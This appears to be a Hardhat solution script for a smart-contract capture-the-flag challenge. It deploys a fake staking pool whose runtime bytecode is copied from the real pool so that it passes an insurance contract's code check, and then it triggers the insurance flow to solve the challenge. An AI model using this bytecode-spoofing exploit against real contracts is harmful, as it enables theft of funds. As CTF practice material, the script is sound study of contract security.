const { ethers } = require("hardhat");
require('dotenv').config();
async function main() {

    let [deployer, user] = await ethers.getSigners();
    const provider = ethers.provider

    const ETHChallenge = await ethers.getContractFactory("Challenge", deployer);
    const ethChallenge = await ETHChallenge.deploy({value: ethers.utils.parseEther("10"), gasLimit:10000000});

    const StakingPool = await ethers.getContractFactory("StakingPool");
    const stakingPool = new ethers.Contract(await ethChallenge.pool(), StakingPool.interface, provider)

    const Insurance = await ethers.getContractFactory("Insurance");
    const insurance = new ethers.Contract(await ethChallenge.insurance(), Insurance.interface, provider)

    const FakeStakingPool = await ethers.getContractFactory("FakeStakingPool", user);
    const stakingPoolCode = await provider.getCode(stakingPool.address);
    let runtime_code = stakingPoolCode.slice(2,stakingPoolCode.length+1)
    const constructor_code = FakeStakingPool.bytecode.slice(0, FakeStakingPool.bytecode.length - runtime_code.length)
    const deployed_code = constructor_code + runtime_code;
    const factory = new ethers.ContractFactory(StakingPool.interface, deployed_code, user);
    const fakeStakingPool = await factory.deploy(ethChallenge.address, insurance.address, {gasLimit:3000000});

    await fakeStakingPool.connect(user).registerInsurance()
    await fakeStakingPool.connect(user).endOperatorService()
    console.log("isSolved", await ethChallenge.isSolved());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
